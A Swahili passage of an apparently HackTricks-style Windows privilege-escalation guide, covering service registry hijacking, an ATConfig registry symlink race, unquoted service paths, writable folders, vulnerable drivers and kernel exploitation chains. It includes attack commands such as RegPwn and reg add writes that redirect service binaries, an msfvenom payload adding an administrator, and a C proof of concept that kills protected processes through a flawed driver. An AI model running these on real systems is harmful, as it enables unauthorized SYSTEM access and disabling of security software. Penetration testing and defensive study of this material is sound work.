Kagua kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye ufunguo fulani wa huduma. Ingizo la ACL pekee halithibitishi ufikiaji unaofanya kazi: ingizo za deny, tokeni ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za ufunguo wa registry ni tofauti na haki za `SERVICE_CHANGE_CONFIG` na `SERVICE_START` za kifaa cha huduma. Escalation pia inahitaji sehemu ya usanidi wa huduma inayoweza kutumika, njia ya kuanzisha huduma na utambulisho wa huduma wenye ruhusa za juu zaidi. Angalia marejeo ya Microsoft kuhusu [haki za ufunguo wa registry](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [haki za ufikiaji wa huduma](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Mbio ya symlink ya Registry hadi kuandika thamani yoyote ya HKLM (ATConfig)

Baadhi ya vipengele vya Accessibility vya Windows huunda funguo za **ATConfig** kwa kila mtumiaji, ambazo baadaye hunakiliwa na mchakato wa **SYSTEM** kwenye ufunguo wa session wa HKLM. **Race** ya **symbolic link** ya registry inaweza kuelekeza uandishi huo wenye mapendeleo kwenye njia yoyote ya HKLM, na hivyo kutoa uwezo wa kuandika thamani yoyote ya HKLM.<sup>[[18]](#references)</sup>

Maeneo ya funguo (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` huorodhesha vipengele vya accessibility vilivyosakinishwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia au mabadiliko ya secure desktop na mtumiaji anaweza kuiandikia.

Mtiririko wa matumizi mabaya (CVE-2026-24291 / ATConfig):

1. Weka thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Anzisha unakili wa secure desktop (kwa mfano, **LockWorkstation**), unaoanzisha mtiririko wa AT broker.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapowashwa, badilisha ufunguo wa **HKLM Session ATConfig** uwe **registry link** inayoelekeza kwenye lengo lililolindwa la HKLM.
4. SYSTEM huandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyoelekezwa upya.

Baada ya kupata uwezo wa kuandika thamani yoyote ya HKLM, tumia hilo kupata LPE kwa kubadilisha thamani za usanidi wa huduma:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/mstari wa amri)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua huduma ambayo mtumiaji wa kawaida anaweza kuanzisha (kwa mfano, **`msiserver`**) na uiwashe baada ya kuandika thamani. **Kumbuka:** utekelezaji wa exploit uliowekwa hadharani **hufunga workstation** kama sehemu ya race.

Zana za mfano (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye registry, inamaanisha **unaweza kuunda registries ndogo kutoka kwenye hii**. Kwa huduma za Windows, hii **inatosha kutekeleza code yoyote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa njia ya executable haijawekwa ndani ya alama za nukuu, Windows itajaribu kutekeleza kila sehemu inayoishia kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Orodhesha njia zote za huduma zisizowekwa ndani ya alama za kunukuu, ukiondoa zile za huduma zilizojengewa ndani ya Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Unaweza kugundua na exploit** udhaifu huu kwa kutumia metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda mwenyewe service binary kwa kutumia metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Hatua za Urejeshaji

Windows huruhusu watumiaji kubainisha hatua zitakazochukuliwa huduma inaposhindwa. Kipengele hiki kinaweza kusanidiwa ili kielekeze kwenye binary. Ikiwa binary hiyo inaweza kubadilishwa, huenda uwezekano wa kuongeza marupurupu ukapatikana. Maelezo zaidi yanapatikana katika [nyaraka rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Malengo ya script za kazi zilizopangwa

Kwa kazi iliyowezeshwa inayoendesha `cmd.exe /c` pamoja na faili ya `.bat` au `.cmd`, kagua script iliyotajwa kwenye **argument za kitendo** pamoja na `cmd.exe`. Vivyo hivyo kwa argument ya faili iliyo wazi ya interpreter, kama vile PowerShell `-File`. Ikiwa faili ya batch ya kazi iliyopangwa ina mwito halisi wa PowerShell `-File`, kagua pia ACL ya script inayorejelewa; vigeu, masharti na uunganishaji wa amri kwenye shell vinahitaji kufuatiliwa mwenyewe. Script au saraka mama inayoweza kuandikwa na mwitaji ni dalili ya utekelezaji kati ya akaunti tofauti tu ikiwa principal iliyosanidiwa ya kazi ni tofauti na mwitaji, na kazi inafikia kitendo hicho. ACL inayoruhusu kuongeza pekee inaweza kuwa muhimu kwa script, lakini `exit` ya mapema au mtiririko mwingine wa udhibiti unaweza kufanya mistari iliyoongezwa isifikike. Thibitisha ACL zinazotumika, [muktadha wa utekelezaji wa kazi](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), saraka ya kufanya kazi, kichochezi na sera ya udhibiti wa programu kabla ya kudai kuwa kuna uwezekano wa kuongeza marupurupu. Orodha ya ukaguzi haipaswi kurekebisha script au kuanzisha kazi.

## Mitiririko yenye majina kwenye faili zinazoweza kufikiwa

Kwenye NTFS, faili inayoweza kusomwa inaweza kuwa na mtiririko wenye jina wa `:$DATA`, ambao maudhui yake hayaonyeshwi kwenye orodha ya kawaida ya saraka. Kwa seti ndogo na husika ya faili za chelezo au usanidi zinazoweza kufikiwa, kagua **majina na ukubwa** wa mitiririko kabla ya kufungua maudhui yoyote; Windows huzionyesha kupitia [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), na PowerShell kupitia [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Jina la mtiririko linalodokeza kuwa kuna siri ni dalili tu. Kagua ruhusa halisi za kusoma za faili, usaidizi wa mfumo wa faili kwa mitiririko, iwapo mtiririko una vitambulisho vinavyoweza kutumika, na akaunti ambayo vitambulisho hivyo huithibitishia. Epuka kuchanganua mitiririko kwa kujirudia na kuchapisha maudhui ya mitiririko wakati wa ukaguzi wa kawaida.

## Ingizo za programu saidizi za Windows Driver Kit zilizopangwa

Windows Driver Kit ya hiari inajumuisha `StandaloneRunner.exe`, ambayo inaweza kutumia faili za `command.txt`, `reboot.rsf` na mradi `working\rsf.rsf` kutoka kwenye saraka yake ya kuendeshea. Kazi iliyopangwa au huduma inayoanzisha programu saidizi hii kwa akaunti yenye marupurupu inaweza kutumia ruhusa ya kuandika ya kiwango cha chini kwenye ingizo hizo kutekeleza amri katika muktadha wa akaunti hiyo, hata kama faili yenyewe ya programu saidizi imelindwa. Thibitisha kuwa kuna mtumiaji mwenye marupurupu anayezitumia, na kwamba **faili zote mbili** za pembeni zinaweza kuundwa au kurekebishwa; kuipata programu saidizi pekee hakutoshi.

Kwa kazi iliyopangwa, kagua [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ya kitendo chake na ACL za njia za faili hizo mbili za pembeni. Ikiwa kazi haijabainisha saraka ya kufanya kazi, saraka ya faili inayotekelezwa ni dalili tu ya kuthibitisha, si uthibitisho wa mahali kazi inaposoma ingizo zake. Sharti la faili ya mradi inayotumika pia lazima litimizwe. Kagua principal halisi ya kazi badala ya kudhani inaendeshwa kama SYSTEM.

## Programu

### Programu Zilizosakinishwa

Kagua **ruhusa za binary** (huenda ukaweza kubadilisha moja na kuongeza marupurupu) na **za folda** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Njia ya kurekebisha agent ya Checkmk Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) huathiri agent za zamani za Checkmk Windows zilizokuwa zikiandika command files kwenye `C:\Windows\Temp`, kisha kutekeleza faili iliyokuwepo awali na iliyolindwa dhidi ya kuandikwa upya pale uingizwaji uliposhindwa. Vendor alirekebisha tatizo hilo katika 2.1.0p40, 2.2.0p23, 2.3.0b1, na 2.4.0b1. Kagua kiwango kamili cha patch kilichosakinishwa na iwapo operesheni ya agent iliyoathiriwa inaweza kuendeshwa; lebo ya branch pekee kama `2.1` haiwezi kuthibitisha uwepo wa athari. Enumeration inaweza kukagua toleo, hali ya service, na ruhusa za Temp bila kuunda faili au kuanzisha command za agent.

#### Ukaguzi wa SAML service ya ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) iliathiri ADSelfService Plus build 6210 na za awali; vendor alirekebisha tatizo hilo katika build 6211. Inahusika tu ikiwa SAML SSO **imewashwa au iliwahi kuwashwa**. Kwa hiyo, ingizo la bidhaa iliyosakinishwa au njia ya service ni kidokezo tu, si uamuzi wa kuwepo kwa vulnerability: thibitisha build halisi, historia ya usanidi wa SAML, ufikikaji wa service kupitia mtandao, na account inayoendesha service hiyo. Code execution kupitia service hutumia privileges za account hiyo; utekelezaji kama SYSTEM unahitaji instance inayoendeshwa kama SYSTEM. Faili ya `OfflineBackup_*.ezip` inayoweza kusomeka ndani ya directory ya Backup ya bidhaa ni kidokezo tofauti cha encrypted backup, si ushahidi wa credential inayoweza kutumika au SAML flaw hii. Rekodi njia yake na access rights bila kuifungua wakati wa routine enumeration.

#### Mipaka ya Jenkins controller na domain account

Kwenye Windows Jenkins controller, tofautisha ruhusa ya kuunda au kusanidi job na ruhusa ya kuianzisha: [Jenkins huandika kuwa hizi ni ruhusa tofauti za `Job/Create`, `Job/Configure`, na `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ratiba iliyosanidiwa au remote trigger inaweza kutoa njia nyingine ya kuendesha build, lakini thibitisha kuwa imewezeshwa na build inaendeshwa kweli. Utekelezaji hutumia identity ya controller au agent iliyochaguliwa, na credential iliyohifadhiwa inaweza kutumika tu ikiwa job inaweza kufikia scope yake. Tofauti na hilo, kagua ufikiaji wa metadata ya `JENKINS_HOME`: Jenkins huhifadhi credential material na encryption keys katika `credentials.xml`, `secrets/hudson.util.Secret`, na `secrets/master.key` ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Uwepo wa faili hizo pekee hauonyeshi password; thibitisha **read access ya faili zinazohitajika** na njia tofauti ya kutumia tena account bila kuchapisha secrets kwenye matokeo yanayoshirikiwa. Ikiwa account hiyo ina ruhusa ya kuandika `scriptPath` ya AD user object, thibitisha kuwa script path inaweza kuandikwa na kuna logon halisi au consumer iliyopangwa inayotekeleza script hiyo kama target user kabla ya kuichukulia kama utekelezaji kati ya watumiaji. Udhibiti zaidi wa group unahitaji kuthibitisha kando effective AD rights.

#### Identity ya Azure Pipelines self-hosted agent

Kwa mradi wa Azure DevOps Server au Azure Pipelines, tofautisha ruhusa ya **kuunda au kuhariri** pipeline na ruhusa ya **kuqueue** pipeline hiyo na kutumia agent pool iliyochaguliwa; [Microsoft huandika kuhusu ruhusa za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) na [idhini ya pool](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) kama masuala tofauti. Ikiwa account yenye privileges za chini inaweza kuwasilisha script step na kuendesha pipeline hiyo kwenye self-hosted Windows agent, step hutekelezwa kama [account ya operating system iliyosanidiwa kwa agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Thibitisha pipeline halisi, vizuizi vya branch/resource, pool iliyoidhinishwa, job inayoweza kuendeshwa, na identity ya agent service kabla ya kudai kuna mpito kati ya watumiaji au kwenda SYSTEM. Agent iliyosakinishwa, project role, au ruhusa ya kuandika repository ni vidokezo tu; kagua ruhusa na metadata ya local service bila kuanzisha build wakati wa passive enumeration.

#### Credentials za Microsoft Entra Connect Sync

[Microsoft hutofautisha](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **ADSync service account**, inayoendesha synchronization service na kufikia SQL database yake, na **AD DS connector account**, ambayo directory permissions zake hutegemea sync features zilizos konfigurishwa. Connector credentials huhifadhiwa zikiwa encrypted kwenye database hiyo, huku key material [ikilindwa na DPAPI chini ya ADSync service account](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sync service iliyosakinishwa, group inayodokeza kuwa ya local administrator, au kuona database pekee hakuthibitishi kuwa credential inaweza kufunguliwa au kuwa kuna domain escalation. Kagua kando ruhusa halisi za kusoma database, ufikiaji wa service account/key, mpangilio wa installation na SQL, connector identity iliyosanidiwa, na effective AD privileges za identity hiyo. Routine enumeration inapaswa kuonyesha metadata ya service na ufikiaji pekee, si kuquery au kuchapisha secrets zilizohifadhiwa.

#### Ruhusa za support DLL za printer driver

Printer driver iliyosakinishwa inaweza kuhifadhi support DLLs chini ya `C:\ProgramData` na kuzipakia ndani ya print process yenye privileges zaidi. Kagua directory halisi ya driver na DLL ACLs, pamoja na parent directories na reparse points, hata kama printer WMI enumeration imekataliwa. Kwa [tatizo la Ricoh printer-driver CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), njia iliyoripotiwa ilikuwa `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [ufichuzi wa awali](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) unaeleza kupakiwa kwa DLL na `PrintIsolationHost.exe`. ACL inayoruhusu kuandika ni kidokezo tu: thibitisha effective write access baada ya deny entries, kuwa driver husika imesakinishwa na inapakia faili hiyo chini ya privileged identity, na kama driver iliyosasishwa na vendor au security program imerekebisha installation. Usihitimishe kuwa kuna vulnerability kutokana na jina la directory au toleo la driver pekee.

### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha config file fulani ili kusoma faili maalum, au kama unaweza kubadilisha binary itakayoendeshwa na account ya Administrator (schedtasks).

Njia moja ya kutafuta ruhusa dhaifu kwenye folder/files za mfumo ni kufanya:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ hupakia kiotomatiki DLL zozote za plugin zilizo ndani ya folda zake ndogo za `plugins`. Ikiwa kuna usakinishaji wa portable/nakala unaoweza kuandikiwa, kuweka plugin hasidi husababisha utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa (ikiwemo kutoka `DllMain` na callbacks za plugin).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Angalia kama unaweza kubadilisha registry au binary itakayotekelezwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili upate maelezo zaidi kuhusu **maeneo ya autoruns yanayovutia kwa ajili ya kuongeza marupurupu**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zozote **za ajabu au zilizo hatarishi** kutoka kwa **third party**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ikiwa driver inaonyesha primitive ya arbitrary kernel read/write (jambo la kawaida kwa IOCTL handlers zilizoundwa vibaya), unaweza kufanya privilege escalation kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory.<sup>[[13]](#references)</sup> Tazama technique ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kwa race-condition bugs ambapo call iliyo hatarini hufungua Object Manager path inayodhibitiwa na attacker, kupunguza kasi ya lookup kimakusudi (kwa kutumia components zenye max-length au minyororo ya deep directory) kunaweza kuongeza muda wa dirisha kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, na I/O ring pivots

Baadhi ya Windows kernel LPE chains zinaweza kujengwa kutokana na bugs mbili ambazo kila moja ni dhaifu kivyake: **cancel-safe queue lifetime race** inayofree request/CBD huku queue lock ikiwa bado imefungwa, na disclosure ya **lock-release-before-copy** inayovuja allocation ya paged-pool iliyofree wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Maelezo ya ukaguzi na exploitation:

- **Free-under-lock + cancel afterwards**: tafuta success path inayotekeleza **Acquire -> CompleteRequest/free -> Release** huku cancel path ikitekeleza **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa success path inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachia CBDQ/CSQ lock, thread iliyozuiwa ndani ya `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofree kwa remove callback ya driver.
- **Reclaim object ya queue iliyofree** kwa allocation ya paged-pool yenye ukubwa sawa na inayodhibitiwa na attacker. `NPFS` Data Queue Entries zinafaa kwa sababu payload na ukubwa wake vinaweza kudhibitiwa, na unaweza kuvichunguza baadaye kwa pipe read/peek operations. Ikiwa object iliyofree ina list links, ziandike upya kwa **cyclic list ya fake request nodes zilizo kwenye user memory** ili driver iendelee kuchakata request structures zilizobainishwa na attacker badala ya kusimama kwenye list head ya awali.
- **Boresha write inayotabirika**: ikiwa fake request inaelekeza upya nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / sehemu zilizo karibu na refcount), huenda ukapata kernel write ambayo **address yake inadhibitiwa lakini value yake haidhibitiwi**. Katika hali hiyo, lenga field ya **length/size** ya sprayed pool object badala ya code/data pointer ya mwisho, kisha pitia spray hadi object iliyoharibiwa itoe **out-of-bounds paged-pool read**.
- **Muundo wa disclosure unaoweza kuathiriwa na race**: syscall yoyote inayotekeleza `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni candidate nzuri. Reliability huongezeka ikiwa attacker anaweza kupanua buffer inayonakiliwa (kwa mfano, kwa kuongeza entries nyingi za list/resource zinazoongeza ukubwa wa mwisho wa allocation ya serializer), kwa sababu copy ndefu zaidi hupanua muda wa kubadilisha object bila kusababisha mashine kucrash.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays ni disclosure targets bora kwa sababu ukubwa wao wa paged-pool unadhibitiwa na attacker (`8 * regBufferCnt`) na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Leak mojawapo ya arrays hizi, pata `IORING_OBJECT` inayoizunguka, kisha haribu **`RegBuffers`** na **`RegBuffersCount`** ili I/O ring operations zinazofuata zitumie entries zilizoghushiwa na attacker na kutoa arbitrary kernel read/write. Ikiwa write pekee inayopatikana inakupa byte isiyobadilika (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kuunda user pointer yenye byte zinazojirudia kama `0x0101010101010101`, imap kwa `VirtualAlloc`, na uweke forged registered-buffer array hapo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Baada ya kupata arbitrary kernel read/write kutoka kwa I/O ring iliyoharibika, iba SYSTEM token kwa kutumia workflow ya kawaida ya post-primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives za memory corruption kwenye registry hive

Udhaifu wa kisasa wa hive hukuwezesha kupanga layout za deterministic, kutumia vibaya descendants za HKLM/HKU zinazoweza kuandikwa, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion ya direct-mode ya `RtlQueryRegistryValues` kutokana na paths zinazodhibitiwa na mshambuliaji

Baadhi ya drivers hukubali registry path kutoka userland, hukagua tu kwamba ni string halali ya UTF-16, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` kwa kutumia `RTL_QUERY_REGISTRY_DIRECT` kuandika kwenye scalar ya stack kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na aina **halisi** ya registry, si aina ambayo developer alitarajia.

Hii hutengeneza primitives mbili muhimu:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: absolute path ya `\Registry\...` inayodhibitiwa na mtumiaji huiruhusu driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kama zipo kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kuzifikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` inaweza kutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Vidokezo vya practical exploitation:

- **Mitigation ya Windows 8+**: ikiwa query itagusa **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploit ibaki kutumika, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikwa za `\Registry\Machine`, kisha rudia scan kwa kutumia token ya **low-integrity** iliyorudiwa ili kupata keys zinazofikika kutoka kwenye sandboxed contexts:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 kwenye `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza kufunika kwa sehemu pointer ya callback/function iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: mode ya moja kwa moja hutegemea `EntryContext` kuelekeza kwenye `UNICODE_STRING`. Ikiwa code itapakia kwanza `REG_DWORD` inayodhibitiwa na mshambuliaji kwenye scalar ya stack, kisha itumie tena buffer hiyo hiyo kusoma string, mshambuliaji hudhibiti `Length`/`MaximumLength` na huathiri kwa kiasi pointer ya `Buffer`, hivyo kusababisha uandishi wa kernel unaodhibitiwa kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, mode ya moja kwa moja huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani hasi inayodhibitiwa na mshambuliaji kwenye scalar iliyotumiwa tena, swali linalofuata la `REG_BINARY` hunakili baiti za mshambuliaji moja kwa moja juu ya nafasi za stack zilizo karibu; mara nyingi hii ndiyo njia safi zaidi ya kufunika pointer nzima ya callback.

Muundo mzuri wa kutafuta: **usomaji wa registry wa aina tofauti ndani ya variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zilizotumiwa tena, na code paths ambapo usomaji wa kwanza wa registry hudhibiti iwapo usomaji wa pili utafanyika.

#### Kutumia vibaya kutokuwepo kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizosainiwa huunda device object yao kwa SDDL thabiti kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, DACL salama hailazimishwi device inapofunguliwa kupitia path iliyo na component ya ziada, hivyo mtumiaji yeyote asiye na mapendeleo anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishapoweza kufungua device, anaweza kutumia vibaya IOCTL zenye mapendeleo ambazo driver hutoa ili kupata LPE na kufanya tampering. Uwezo ulioonekana kwenye mazingira halisi ni pamoja na:
- Kurudisha handles zenye ufikiaji kamili kwa processes zozote (kuiba token / kupata SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika raw disk bila vikwazo (tampering wakati mfumo haujaanzishwa, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, ikiwemo Protected Process/Light (PP/PPL), kuruhusu kuua AV/EDR kutoka user land kupitia kernel.

Muundo mdogo wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa operations zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurudisha handles.
- Weka mipaka kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa ingizo) na uzingatie brokered models badala ya privileges za moja kwa moja za kernel.

Mawazo ya detection kwa defenders
- Fuatilia ufunguaji wa majina ya devices yanayotiliwa shaka kutoka user-mode (k.m., \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza vulnerable driver blocklist ya Microsoft (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folder iliyo kwenye PATH** unaweza kuweza kuteka DLL inayopakiwa na process na **kupata privileges za juu**.<sup>[[2]](#references)</sup>

Angalia ruhusa za folders zote zilizo ndani ya PATH:

```bash
